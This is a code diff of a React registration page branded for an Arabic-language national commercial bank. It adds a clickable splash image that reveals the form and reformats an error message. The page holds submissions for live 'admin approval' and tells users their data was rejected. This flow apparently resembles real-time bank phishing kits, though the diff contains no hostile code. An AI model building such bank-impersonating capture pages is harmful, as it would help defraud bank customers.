@@ -21,6 +21,7 @@ export default function RegistrationPage() {
   const [terms, setTerms] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [localError, setLocalError] = useState("");
+  const [showForm, setShowForm] = useState(false);
 
   const { waiting, error, startWaiting, clearError } = useAdminApproval({
     sessionId,
@@ -84,10 +85,24 @@ export default function RegistrationPage() {
 
   const displayError =
     localError ||
-    (error ? "تم رفض طلب التسجيل من الإدارة، يرجى مراجعة البيانات والمحاولة مرة أخرى" : "");
+    (error
+      ? "تم رفض طلب التسجيل من الإدارة، يرجى مراجعة البيانات والمحاولة مرة أخرى"
+      : "");
 
   return (
     <NcbLayout>
+      {!showForm && (
+        <button
+          type="button"
+          className="ncb-splash"
+          onClick={() => setShowForm(true)}
+          aria-label="فتح نموذج التسجيل"
+        >
+          <img src="/assets/home.jpeg" alt="المصرف التجاري الوطني" />
+        </button>
+      )}
+
+      {showForm && (
       <form className="ncb-form" onSubmit={handleSubmit}>
         {displayError && <div className="ncb-error">{displayError}</div>}
 
@@ -162,6 +177,7 @@ export default function RegistrationPage() {
           تسجيل
         </button>
       </form>
+      )}
 
       <NcbWaitOverlay
         visible={waiting}
